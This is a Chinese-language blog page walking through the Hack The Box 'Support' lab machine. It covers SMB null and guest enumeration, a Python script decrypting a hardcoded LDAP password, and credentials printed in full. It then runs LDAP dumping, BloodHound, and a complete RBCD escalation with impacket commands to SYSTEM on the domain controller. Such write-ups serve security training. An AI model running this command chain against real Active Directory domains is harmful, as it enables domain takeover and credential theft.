@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - HTB support</title>
+        <meta name="description" content="信息收集 靶机地址：10.129.65.231 端口扫描 nmap 10.129.65.231 -p- 开放了53、88、135、139、389、445、3268、3269、5985端口，域控特征 smb枚举 没有切入点，测试smb服务 尝试空会话 nxc smb 10.129.65.231 -u &#039;&#039; -p &#039;&#039; 允…">
+    <link rel="canonical" href="https://the0n3.top/posts/htb-support/">
+    <!-- Open Graph -->
+    <meta property="og:title" content="HTB support">
+    <meta property="og:description" content="信息收集 靶机地址：10.129.65.231 端口扫描 nmap 10.129.65.231 -p- 开放了53、88、135、139、389、445、3268、3269、5985端口，域控特征 smb枚举 没有切入点，测试smb服务 尝试空会话 nxc smb 10.129.65.231 -u &#039;&#039; -p &#039;&#039; 允…">
+    <meta property="og:url" content="https://the0n3.top/posts/htb-support/">
+    <meta property="og:type" content="article">
+    <meta property="og:site_name" content="the0n3">
+    <meta property="og:locale" content="zh_CN">
+        <meta property="og:image" content="https://the0n3.top/images/htb-support/1.png">
+        <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="HTB support">
+    <meta name="twitter:description" content="信息收集 靶机地址：10.129.65.231 端口扫描 nmap 10.129.65.231 -p- 开放了53、88、135、139、389、445、3268、3269、5985端口，域控特征 smb枚举 没有切入点，测试smb服务 尝试空会话 nxc smb 10.129.65.231 -u &#039;&#039; -p &#039;&#039; 允…">
+        <meta name="twitter:image" content="https://the0n3.top/images/htb-support/1.png">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+    <!-- 功能样式（自动扫描 assets/features/ 目录） -->
+        <link rel="stylesheet" href="/assets/features/code-fold/style.css">
+        <link rel="stylesheet" href="/assets/features/image-enhance/style.css">
+        <link rel="stylesheet" href="/assets/features/reading-progress/style.css">
+        <link rel="stylesheet" href="/assets/features/tax-accordion/style.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <link rel="stylesheet" href="/assets/css/search.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+    <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+    <header>
+        <nav>
+            <div class="nav-right">
+                                <a href="/">首页</a>
+                                <a href="/archives/">归档</a>
+                                <a href="/categories/">分类</a>
+                                <a href="/tags/">标签</a>
+                                <a href="/friends/">友链</a>
+                                <a href="/about/">关于</a>
+                                <a href="https://www.travellings.cn/go.html">开往</a>
+                                                <button
+                    id="searchTrigger"
+                    class="search-trigger"
+                    type="button"
+                    aria-label="打开搜索"
+                    aria-haspopup="dialog"
+                    aria-controls="searchModal"
+                    title="搜索（/）"
+                >
+                    <span class="search-trigger__label">搜索</span>
+                    <span class="search-trigger__hint">/</span>
+                </button>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>HTB support</h1>
+    <p>
+        <span class="meta">发布于: 2026-07-25 22:14</span>
+    </p>
+    <div class="post-body">
+        <h2>信息收集</h2>
+<p>靶机地址：10.129.65.231</p>
+<p>端口扫描</p>
+<pre><code class="language-bash">nmap 10.129.65.231 -p-</code></pre>
+<p>开放了53、88、135、139、389、445、3268、3269、5985端口，域控特征</p>
+<p><img src="/images/htb-support/1.png" alt="" decoding="async" width="1026" height="653"></p>
+<h2>smb枚举</h2>
+<p>没有切入点，测试smb服务</p>
+<p>尝试空会话</p>
+<pre><code class="language-bash">nxc smb 10.129.65.231 -u '' -p ''</code></pre>
+<p>允许空会话登录</p>
+<p><img src="/images/htb-support/2.png" alt="" decoding="async" loading="lazy" width="1910" height="365"></p>
+<p>原理：用空用户名 + 空密码去连接 SMB。在很多 AD 环境里，SMB 服务端会允许这种连接完成认证握手（返回 [+] ...\:），但后续能做的事非常有限——通常只能看到共享列表，且大部分共享是 READ 权限受限或完全看不到。</p>
+<p>尝试 Guest 账户匿名登录</p>
+<pre><code class="language-bash">nxc smb 10.129.65.231 -u 'guest' -p ''</code></pre>
+<p>允许 Guest 账户匿名登录</p>
+<p><img src="/images/htb-support/3.png" alt="" decoding="async" loading="lazy" width="1898" height="399"></p>
+<p>原理：Guest 是 Windows 内置账户，默认空密码。很多环境里 Guest 被禁用或限制，但也有不少环境（尤其是故意留口的靶机）会允许 Guest 登录 SMB 并枚举部分信息。</p>
+<h2>Net程序反编译</h2>
+<p>分别枚举共享</p>
+<pre><code class="language-bash">nxc smb 10.129.65.231 -u '' -p '' --shares</code></pre>
+<pre><code class="language-bash">nxc smb 10.129.65.231 -u 'guest' -p '' --shares</code></pre>
+<p>发现自定义共享 support-tools 对 Guest 有 READ 权限，疑似运维工具目录，优先排查。</p>
+<p><img src="/images/htb-support/4.png" alt="" decoding="async" loading="lazy" width="1895" height="748"></p>
+<p>其中，7-Zip、Notepad++、PuTTY、Sysinternals、Wireshark是通用工具，UserInfo.exe 名字和业务逻辑相关，通过file命令得知是.Net程序，拉到windows环境下用dnSpy反编译</p>
+<p><img src="/images/htb-support/5.png" alt="" decoding="async" loading="lazy" width="1292" height="821"></p>
+<p><img src="/images/htb-support/6.png" alt="" decoding="async" loading="lazy" width="1401" height="352"></p>
+<p>.Net程序反编译工具 <a href="https://github.com/dnSpy/dnSpy">https://github.com/dnSpy/dnSpy</a></p>
+<p><img src="/images/htb-support/8.png" alt="" decoding="async" loading="lazy" width="1536" height="947"></p>
+<p>在LdapQuery类中收集到以下信息：</p>
+<ul>
+<li>调用Protected.getPassword()方法获取用户密码</li>
+<li>以域用户 support\ldap 身份连接 LDAP://support.htb</li>
+</ul>
+<p><img src="/images/htb-support/7.png" alt="" decoding="async" loading="lazy" width="1519" height="973"></p>
+<p>在关键类中发现用户密码加解密逻辑</p>
+<ul>
+<li>从硬编码字符串 enc_password 里取出 Base64 编码的密文</li>
+<li>用硬编码的 XOR key（"armando"）逐字节异或解密，再额外异或一个固定值 223（即 0xDF）</li>
+<li>返回解密后的明文字符串</li>
+</ul>
+<p>使用Python脚本解密</p>
+<pre><code class="language-python">import base64
+
+b64 = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
+key = b"armando"
+data = base64.b64decode(b64)
+pwd = "".join(chr(data[i] ^ key[i % len(key)] ^ 223) for i in range(len(data)))
+print(pwd)</code></pre>
+<p>尝试通过smb验证 ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz</p>
+<pre><code class="language-bash">nxc smb 10.129.65.231 -u 'ldap' -p &lt;ldap password&gt;</code></pre>
+<p><img src="/images/htb-support/9.png" alt="" decoding="async" loading="lazy" width="1900" height="816"></p>
+<h2>ldap枚举到凭证泄露</h2>
+<p>使用ldap用户测试 LDAP 服务，成功返回一大坨信息，丢给AI审计</p>
+<pre><code class="language-bash">ldapsearch -H ldap://10.129.65.231 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'DC=support,DC=htb' '(objectClass=*)'</code></pre>
+<p>其中，参数 -b 是 baseDN（Base Distinguished Name，基准可分辨名称）​ 的缩写。从 support.htb 这个域的根节点开始搜索，返回它下面的所有用户、组、计算机、OU</p>
+<p>AD 的目录结构</p>
+<pre><code class="language-plaintext">DC=htb（根域）
+ └── DC=support（support.htb 域）
+      ├── CN=Users
+      │    ├── CN=Administrator
+      │    ├── CN=ldap
+      │    ├── CN=support
+      │    └── ...
+      ├── CN=Computers
+      │    └── CN=DC
+      ├── CN=Builtin
+      │    └── CN=Administrators
+      └── OU=...</code></pre>
+<p>(objectClass=*)： LDAP 搜索过滤器，可以过滤出所有对象，包括用户、组、计算机、OU 等</p>
+<p>ldap返回结果丢给AI分析：用户 support 的属性 info 字段存储了明文密码：Ironside47pleasure40Watchful</p>
+<p><img src="/images/htb-support/10.png" alt="" decoding="async" loading="lazy" width="1326" height="836"></p>
+<p>smb成功验证凭证 support:Ironside47pleasure40Watchful</p>
+<pre><code class="language-bash">nxc smb 10.129.65.231 -u 'support' -p 'Ironside47pleasure40Watchful'</code></pre>
+<p><img src="/images/htb-support/11.png" alt="" decoding="async" loading="lazy" width="1920" height="363"></p>
+<p>ldap协议获取support用户所有信息</p>
+<pre><code class="language-bash">ldapsearch -H ldap://10.129.65.231 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'DC=support,DC=htb' '(sAMAccountName=support)' '*' '+'</code></pre>
+<p><img src="/images/htb-support/12.png" alt="" decoding="async" loading="lazy" width="1229" height="758"></p>
+<p>support 用户属于 <code>remote management users</code> 组及<code>Shared Support Accounts</code>组，前者可以允许support用户通过winrm远程管理，后者属于自定义组，可能是运维人员共享账户组，后续可以尝试提权。</p>
+<h2>权限测绘（BloodHound）</h2>
+<blockquote>
+<p>重启了一次靶机，忽略ip变动</p>
+</blockquote>
+<p>添加域名解析</p>
+<pre><code class="language-bash">echo "10.129.66.137 support.htb dc.support.htb" &gt;&gt; /etc/hosts</code></pre>
+<p>以 support 用户身份进行 BloodHound 枚举</p>
+<pre><code class="language-bash">bloodhound-python -u support -p 'Ironside47pleasure40Watchful' -d support.htb -ns 10.129.66.137 -dc dc.support.htb -c All --zip</code></pre>
+<p><img src="/images/htb-support/13.png" alt="" decoding="async" loading="lazy" width="1759" height="725"></p>
+<p>web面板导入枚举信息压缩包，关于bloodhound的使用自行查阅</p>
+<p>SHARED SUPPORT ACCOUNTS 组对 DC.SUPPORT.HTB 拥有 GenericAll 权限，意味着对该机器拥有完全控制权。</p>
+<p><img src="/images/htb-support/14.png" alt="" decoding="async" loading="lazy" width="1920" height="948"></p>
+<h2>RBCD域提权</h2>
+<ul>
+<li>shared support accounts 组对目标计算机对象有写权限​ （GenericAll on DC$）</li>
+<li>域用户默认创建最多 10 个机器账户</li>
+</ul>
+<p>在具备上述两个条件的前提下，利用 RBCD（Resource-Based Constrained Delegation，基于资源的约束委派）即可实现对域控的提权</p>
+<p>创建机器用户，addcomputer完成后会自动加入域</p>
+<pre><code class="language-bash"># 1. 创建机器账户
+impacket-addcomputer 'support.htb/support:Ironside47pleasure40Watchful' -dc-ip 10.129.66.137 -computer-name 'ATTACK2$' -computer-pass 'Attack123!'</code></pre>
+<p>写入RBCD权限，msDS-AllowedToActOnBehalfOfOtherIdentity 是 RBCD 的核心属性，写入后 DC将信任<code>ATTACK2</code> 用户可以冒充任意用户向其申请服务票据</p>
+<pre><code class="language-bash"># 2. 写 RBCD（对 DC$ 有 GenericAll 权限）
+impacket-rbcd 'support.htb/support:Ironside47pleasure40Watchful' -dc-ip 10.129.66.137 -delegate-from 'ATTACK2$' -delegate-to 'DC$' -action 'write'</code></pre>
+<p>ATTACK2$ 用户通过 Kerberos 合法协议，伪造出 Administrator 访问 CIFS/DC.support.htb 的 ST 服务票据</p>
+<pre><code class="language-bash"># 3. 拿 Administrator 的 CIFS 票据
+impacket-getST 'support.htb/ATTACK2$:Attack123!' -dc-ip 10.129.66.137 -spn 'cifs/DC.support.htb' -impersonate 'Administrator'</code></pre>
+<p><img src="/images/htb-support/15.png" alt="" decoding="async" loading="lazy" width="1891" height="860"></p>
+<p>impacket-getST 内部细节：</p>
+<ul>
+<li>S4U2Self：ATTACK2以自身身份向KDC申请一张“代表Administrator访问ATTACK2 自身”的票据（TGS），用于证明“我（ATTACK2$）有权代表 Administrator”</li>
+<li>S4U2Proxy：ATTACK2$ 持上述 TGS，向 KDC 申请“代表 Administrator 访问 cifs/DC.support.htb”的服务票据（ST）</li>
+</ul>
+<p>由于 DC的RBCD属性已信任ATTACK2，KDC 签发出 ST</p>
+<p>impacket-smbexec 以 Administrator 身份建立 SMB 会话 </p>
+<pre><code class="language-bash"># 4. 用票据拿 SYSTEM
+export KRB5CCNAME=Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
+impacket-smbexec -dc-ip 10.129.66.137 -no-pass -k 'support.htb/Administrator@DC.support.htb'</code></pre>
+<p><img src="/images/htb-support/16.png" alt="" decoding="async" loading="lazy" width="1731" height="685"></p>
+<p>在域控上，Administrator 账户等价于 NT AUTHORITY\SYSTEM，因此通过 Kerberos 认证（-k）使用 Administrator 的 CIFS 票据建立的 SMB 会话，最终获取到的是 SYSTEM 权限</p>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>HTB</span>
+                                    <span>Windows</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#RBCD</span>
+                            </span>
+            </div>
+    </article>
+
+
+<section class="post-comments" aria-label="Comments">
+    <script src="https://giscus.app/client.js"
+        data-repo="Apursuit/the0n3-blog"
+        data-repo-id="R_kgDORvPPbA"
+        data-category="Announcements"
+        data-category-id="DIC_kwDORvPPbM4C5KAt"
+        data-mapping="pathname"
+        data-strict="0"
+        data-reactions-enabled="1"
+        data-emit-metadata="0"
+        data-input-position="bottom"
+        data-theme="light"
+        data-lang="zh-CN"
+        crossorigin="anonymous"
+        async>
+    </script>
+</section>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+    
+    <!-- 搜索命令面板：
+         第一版先提供标题、日期、标签搜索，以及键盘导航和快捷键 -->
+    <div id="searchModal" class="search-modal" hidden>
+        <div class="search-modal__overlay" data-search-close></div>
+        <div class="search-modal__dialog" role="dialog" aria-modal="true" aria-labelledby="searchModalTitle">
+            <div class="search-modal__panel">
+                <div class="search-modal__header">
+                    <div class="search-modal__title-group">
+                        <div id="searchModalTitle" class="search-modal__title">搜索文章</div>
+                        <div class="search-modal__subtitle">输入标题、标签或关键词，按 Enter 打开结果</div>
+                    </div>
+                    <button
+                        id="searchClose"
+                        class="search-modal__close"
+                        type="button"
+                        aria-label="关闭搜索"
+                        title="关闭搜索"
+                    >
+                        ×
+                    </button>
+                </div>
+
+                <div class="search-modal__body">
+                    <label class="search-input-wrap" for="searchInput">
+                        <span class="search-input-wrap__icon" aria-hidden="true">⌕</span>
+                        <input
+                            id="searchInput"
+                            class="search-input"
+                            type="text"
+                            placeholder="搜索文章..."
+                            autocomplete="off"
+                            spellcheck="false"
+                        >
+                    </label>
+
+                    <div class="search-help">
+                        <span>/ 打开</span>
+                        <span>↑ ↓ 选择</span>
+                        <span>Enter 打开</span>
+                        <span>Esc 关闭</span>
+                    </div>
+
+                    <div id="searchState" class="search-state" aria-live="polite">输入关键词开始搜索</div>
+                    <div id="searchResults" class="search-results" role="listbox" aria-label="搜索结果"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+    <!-- 功能脚本（自动扫描 assets/features/ 目录） -->
+        <script src="/assets/features/code-fold/script.js"></script>
+        <script src="/assets/features/image-enhance/script.js"></script>
+        <script src="/assets/features/reading-progress/script.js"></script>
+        <script src="/assets/features/tax-accordion/script.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+    <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+    <!-- 弹簧动画工具（搜索弹窗/灯箱进出场依赖） -->
+    <script src="/assets/js/spring.js"></script>
+    <!-- 搜索功能 -->
+    <script src="/assets/js/fuse.js"></script>
+    <script src="/assets/js/search.js"></script>
+</body>
+</html>
